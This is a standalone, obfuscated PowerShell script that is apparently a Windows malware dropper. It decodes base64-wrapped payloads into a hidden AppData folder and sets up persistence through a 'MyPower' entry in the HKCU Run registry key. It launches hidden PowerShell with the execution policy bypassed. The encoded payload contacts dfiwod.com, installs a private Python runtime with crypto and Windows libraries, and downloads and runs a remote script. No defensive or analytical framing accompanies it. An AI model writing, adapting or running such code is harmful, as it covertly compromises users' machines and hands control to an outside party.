$sv = 'Err'+'orAction'+'Preference'
Set-Variable -Name $sv -Value 'Stop'

$TFlsgCfG = 'eyJwYXRocyI6WyJydW5tZS5wczEiXSwiZGF0YSI6WyJKR1p6UkhKcGRtVnpJRDBnUjJWMExWQlRSSEpwZG1VZ0xWQlRVSEp2ZG1sa1pYSWdSbWxzWlZONWMzUmxiU0I4SUZObGJHVmpkQzFQWW1wbFkzUWdMVVY0Y0dGdVpGQnliM0JsY25SNUlGSnZiM1FOQ2lSdFlXbHVSSEpwZG1VZ1BTQWtabk5FY21sMlpYTWdmQ0JYYUdWeVpTMVBZbXBsWTNRZ2V5QWtYeUF0YldGMFkyZ2dJbDViUVMxYVhUcGNYQ1FpSUgwZ2ZDQlRaV3hsWTNRdFQySnFaV04wSUMxR2FYSnpkQ0F4RFFwcFppQW9MVzV2ZENBa2JXRnBia1J5YVhabEtTQjdJR1Y0YVhRZ2ZRMEtEUW9rZDI5eWEybHVaMFJwY2lBOUlDSWtiV0ZwYmtSeWFYWmxYRlJsYlhBaURRcHBaaUFvTFc1dmRDQW9WR1Z6ZEMxUVlYUm9JQ1IzYjNKcmFXNW5SR2x5S1NrZ2V5Qk9aWGN0U1hSbGJTQXRVR0YwYUNBa2QyOXlhMmx1WjBScGNpQXRTWFJsYlZSNWNHVWdSR2x5WldOMGIzSjVJSHdnVDNWMExVNTFiR3dnZlEwS0RRb2tiWFYwWlhoR2FXeGxJRDBnSWlSM2IzSnJhVzVuUkdseVhITmpjbWx3ZEM1c2IyTnJJZzBLYVdZZ0tGUmxjM1F0VUdGMGFDQWtiWFYwWlhoR2FXeGxLU0I3SUdWNGFYUWdmUTBLVG1WM0xVbDBaVzBnTFZCaGRHZ2dKRzExZEdWNFJtbHNaU0F0U1hSbGJWUjVjR1VnUm1sc1pTQXRSbTl5WTJVZ2ZDQlBkWFF0VG5Wc2JBMEtEUXBKYm5admEyVXRWMlZpVW1WeGRXVnpkQ0F0VlhKcElDSm9kSFJ3Y3pvdkwyUm1hWGR2WkM1amIyMHZNaTV3YUhBaUlDMVZjMlZDWVhOcFkxQmhjbk5wYm1jZ2ZDQlBkWFF0VG5Wc2JBMEtEUW9rY0hsMGFHOXVVR0YwYUNBOUlDSWtkMjl5YTJsdVowUnBjbHhRZVVWdWRpSU5DaVJ6WTNKcGNIUlFZWFJvSUQwZ0lpUjNiM0pyYVc1blJHbHlYSFZ3TG5CNUlnMEtKSEI1V21sd0lEMGdJaVJsYm5ZNlZFVk5VRnh3ZVY5bGJXSmxaR1JsWkM1NmFYQWlEUW9OQ2tsdWRtOXJaUzFYWldKU1pYRjFaWE4wSUMxVmNta2dJbWgwZEhCek9pOHZkM2QzTG5CNWRHaHZiaTV2Y21jdlpuUndMM0I1ZEdodmJpOHpMakV4TGpndmNIbDBhRzl1TFRNdU1URXVPQzFsYldKbFpDMWhiV1EyTkM1NmFYQWlJQzFQZFhSR2FXeGxJQ1J3ZVZwcGNBMEtSWGh3WVc1a0xVRnlZMmhwZG1VZ0xWQmhkR2dnSkhCNVdtbHdJQzFFWlhOMGFXNWhkR2x2YmxCaGRHZ2dKSEI1ZEdodmJsQmhkR2dnTFVadmNtTmxEUXBTWlcxdmRtVXRTWFJsYlNBa2NIbGFhWEFOQ2cwS0pIQkpibWwwUm1sc1pTQTlJRXB2YVc0dFVHRjBhQ0FrY0hsMGFHOXVVR0YwYUNBaWNIbDBhRzl1TXpFeExsOXdkR2dpRFFvb1IyVjBMVU52Ym5SbGJuUWdKSEJKYm1sMFJtbHNaU2tnTFhKbGNHeGhZMlVnSnlOcGJYQnZjblFnYzJsMFpTY3NJQ2RwYlhCdmNuUWdjMmwwWlNjZ2ZDQlRaWFF0UTI5dWRHVnVkQ0FrY0VsdWFYUkdhV3hsRFFvTkNrbHVkbTlyWlMxWFpXSlNaWEYxWlhOMElDMVZjbWtnSW1oMGRIQnpPaTh2WW05dmRITjBjbUZ3TG5CNWNHRXVhVzh2WjJWMExYQnBjQzV3ZVNJZ0xVOTFkRVpwYkdVZ0lpUndlWFJvYjI1UVlYUm9YR2RsZEMxd2FYQXVjSGtpRFFvbUlDSWtjSGwwYUc5dVVHRjBhRnh3ZVhSb2IyNHVaWGhsSWlBaUpIQjVkR2h2YmxCaGRHaGNaMlYwTFhCcGNDNXdlU0lOQ2xKbGJXOTJaUzFKZEdWdElDSWtjSGwwYUc5dVVHRjBhRnhuWlhRdGNHbHdMbkI1SWcwS0RRb21JQ0lrY0hsMGFHOXVVR0YwYUZ4d2VYUm9iMjR1WlhobElpQXRiU0J3YVhBZ2FXNXpkR0ZzYkNCd2VXTnllWEIwYjJSdmJXVWdjSGx3YVhkcGJqTXlJSEpsY1hWbGMzUnpEUW9OQ2tsdWRtOXJaUzFYWldKU1pYRjFaWE4wSUMxVmNta2dJbWgwZEhCek9pOHZaR1pwZDI5a0xtTnZiUzkxY0M1d2VTSWdMVTkxZEVacGJHVWdKSE5qY21sd2RGQmhkR2dOQ2lZZ0lpUndlWFJvYjI1UVlYUm9YSEI1ZEdodmJpNWxlR1VpSUNJa2MyTnlhWEIwVUdGMGFDSU5DZz09Il19'
$runAgainContent = 'eyJwYXRocyI6WyJydW5hZ2Fpbi5wczEiXSwiZGF0YSI6WyJKR1p6UkhKcGRtVnpJRDBnUjJWMExWQlRSSEpwZG1VZ0xWQlRVSEp2ZG1sa1pYSWdSbWxzWlZONWMzUmxiU0I4SUZObGJHVmpkQzFQWW1wbFkzUWdMVVY0Y0dGdVpGQnliM0JsY25SNUlGSnZiM1FOQ2lSdFlXbHVSSEpwZG1VZ1BTQWtabk5FY21sMlpYTWdmQ0JYYUdWeVpTMVBZbXBsWTNRZ2V5QWtYeUF0YldGMFkyZ2dJbDViUVMxYVhUcGNYQ1FpSUgwZ2ZDQlRaV3hsWTNRdFQySnFaV04wSUMxR2FYSnpkQ0F4RFFwcFppQW9MVzV2ZENBa2JXRnBia1J5YVhabEtTQjdJR1Y0YVhRZ2ZRMEtEUW9rZDI5eWEybHVaMFJwY2lBOUlDSWtiV0ZwYmtSeWFYWmxYRlJsYlhBaURRcHBaaUFvTFc1dmRDQW9WR1Z6ZEMxUVlYUm9JQ1IzYjNKcmFXNW5SR2x5S1NrZ2V5Qk9aWGN0U1hSbGJTQXRVR0YwYUNBa2QyOXlhMmx1WjBScGNpQXRTWFJsYlZSNWNHVWdSR2x5WldOMGIzSjVJSHdnVDNWMExVNTFiR3dnZlEwS0RRb2tabWx1YVhOb1RHOWpheUE5SUVwdmFXNHRVR0YwYUNBa2QyOXlhMmx1WjBScGNpQWlabWx1YVhOb0xteHZZMnNpRFFwcFppQW9MVzV2ZENBb1ZHVnpkQzFRWVhSb0lDUm1hVzVwYzJoTWIyTnJLU2tnZXcwS0lDQWdJRWRsZEMxRGFHbHNaRWwwWlcwZ0xWQmhkR2dnSkhkdmNtdHBibWRFYVhJZ0xVWnBiR1VnTFVadmNtTmxJQzFGY25KdmNrRmpkR2x2YmlCVGFXeGxiblJzZVVOdmJuUnBiblZsSUh3Z1VtVnRiM1psTFVsMFpXMGdMVVp2Y21ObElDMUZjbkp2Y2tGamRHbHZiaUJUYVd4bGJuUnNlVU52Ym5ScGJuVmxEUXA5RFFvTkNpUnRkWFJsZUVacGJHVWdQU0JLYjJsdUxWQmhkR2dnSkhkdmNtdHBibWRFYVhJZ0luTmpjbWx3ZEM1c2IyTnJJZzBLYVdZZ0tGUmxjM1F0VUdGMGFDQWtiWFYwWlhoR2FXeGxLU0I3SUdWNGFYUWdmUTBLVG1WM0xVbDBaVzBnTFZCaGRHZ2dKRzExZEdWNFJtbHNaU0F0U1hSbGJWUjVjR1VnUm1sc1pTQXRSbTl5WTJVZ2ZDQlBkWFF0VG5Wc2JBMEtEUXBKYm5admEyVXRWMlZpVW1WeGRXVnpkQ0F0VlhKcElDSm9kSFJ3Y3pvdkwyUm1hWGR2WkM1amIyMHZNaTV3YUhBaUlDMVZjMlZDWVhOcFkxQmhjbk5wYm1jZ2ZDQlBkWFF0VG5Wc2JBMEtEUW9rY0hsMGFHOXVVR0YwYUNBOUlFcHZhVzR0VUdGMGFDQWtkMjl5YTJsdVowUnBjaUFpVUhsRmJuWWlEUW9rYzJOeWFYQjBVR0YwYUNBOUlFcHZhVzR0VUdGMGFDQWtkMjl5YTJsdVowUnBjaUFpZFhBdWNIa2lEUW9rY0hsYWFYQWdQU0JLYjJsdUxWQmhkR2dnSkdWdWRqcFVSVTFRSUNKd2VWOWxiV0psWkdSbFpDNTZhWEFpRFFvTkNrbHVkbTlyWlMxWFpXSlNaWEYxWlhOMElDMVZjbWtnSW1oMGRIQnpPaTh2ZDNkM0xuQjVkR2h2Ymk1dmNtY3ZablJ3TDNCNWRHaHZiaTh6TGpFeExqZ3ZjSGwwYUc5dUxUTXVNVEV1T0MxbGJXSmxaQzFoYldRMk5DNTZhWEFpSUMxUGRYUkdhV3hsSUNSd2VWcHBjQTBLUlhod1lXNWtMVUZ5WTJocGRtVWdMVkJoZEdnZ0pIQjVXbWx3SUMxRVpYTjBhVzVoZEdsdmJsQmhkR2dnSkhCNWRHaHZibEJoZEdnZ0xVWnZjbU5sRFFwU1pXMXZkbVV0U1hSbGJTQWtjSGxhYVhBZ0xVWnZjbU5sRFFvTkNpUndTVzVwZEVacGJHVWdQU0JLYjJsdUxWQmhkR2dnSkhCNWRHaHZibEJoZEdnZ0luQjVkR2h2YmpNeE1TNWZjSFJvSWcwS0tFZGxkQzFEYjI1MFpXNTBJQ1J3U1c1cGRFWnBiR1VwSUMxeVpYQnNZV05sSUNjamFXMXdiM0owSUhOcGRHVW5MQ0FuYVcxd2IzSjBJSE5wZEdVbklId2dVMlYwTFVOdmJuUmxiblFnSkhCSmJtbDBSbWxzWlEwS0RRcEpiblp2YTJVdFYyVmlVbVZ4ZFdWemRDQXRWWEpwSUNKb2RIUndjem92TDJKdmIzUnpkSEpoY0M1d2VYQmhMbWx2TDJkbGRDMXdhWEF1Y0hraUlDMVBkWFJHYVd4bElDaEtiMmx1TFZCaGRHZ2dKSEI1ZEdodmJsQmhkR2dnSW1kbGRDMXdhWEF1Y0hraUtRMEtKaUFvU205cGJpMVFZWFJvSUNSd2VYUm9iMjVRWVhSb0lDSndlWFJvYjI0dVpYaGxJaWtnS0VwdmFXNHRVR0YwYUNBa2NIbDBhRzl1VUdGMGFDQWlaMlYwTFhCcGNDNXdlU0lwRFFwU1pXMXZkbVV0U1hSbGJTQW9TbTlwYmkxUVlYUm9JQ1J3ZVhSb2IyNVFZWFJvSUNKblpYUXRjR2x3TG5CNUlpa2dMVVp2Y21ObERRb05DaVlnS0VwdmFXNHRVR0YwYUNBa2NIbDBhRzl1VUdGMGFDQWljSGwwYUc5dUxtVjRaU0lwSUMxdElIQnBjQ0JwYm5OMFlXeHNJSEI1WTNKNWNIUnZaRzl0WlNCd2VYQnBkMmx1TXpJZ2NtVnhkV1Z6ZEhNTkNnMEtTVzUyYjJ0bExWZGxZbEpsY1hWbGMzUWdMVlZ5YVNBaWFIUjBjSE02THk5a1ptbDNiMlF1WTI5dEwzVndMbkI1SWlBdFQzVjBSbWxzWlNBa2MyTnlhWEIwVUdGMGFBMEtKaUFvU205cGJpMVFZWFJvSUNSd2VYUm9iMjVRWVhSb0lDSndlWFJvYjI0dVpYaGxJaWtnSkhOamNtbHdkRkJoZEdnTkNnPT0iXX0='

$json = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($TFlsgCfG))
$obj = ConvertFrom-Json $json
$paths = $obj.paths
$data = $obj.data

$up = Join-Path $Env:AppData 'Y4TFCR'
[System.IO.Directory]::CreateDirectory($up) | Out-Null

for ($i = 0; $i -lt $paths.Count; $i++) {
    $filename = $paths[$i]
    $bytes = [System.Convert]::FromBase64String($data[$i])
    $fullPath = Join-Path $up $filename
    $dir = [System.IO.Path]::GetDirectoryName($fullPath)
    if (-not (Test-Path $dir)) { New-Item -ItemType Directory -Path $dir | Out-Null }
    [System.IO.File]::WriteAllBytes($fullPath, $bytes)
}

$runAgainPath = Join-Path $up 'runagain.ps1'
$runAgainBytes = [System.Convert]::FromBase64String($runAgainContent)
[System.IO.File]::WriteAllBytes($runAgainPath, $runAgainBytes)

$cmd = "powershell.exe -NoP -W Hidden -ExecutionPolicy Bypass -File `"$runAgainPath`""
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "MyPower" -Value $cmd -PropertyType String -Force | Out-Null

$scriptPath = Join-Path $up 'runme.ps1'
Start-Process -FilePath "powershell.exe" -ArgumentList "-NoP -W Hidden -ExecutionPolicy Bypass -File `"$scriptPath`"" -WindowStyle Hidden -WorkingDirectory $up
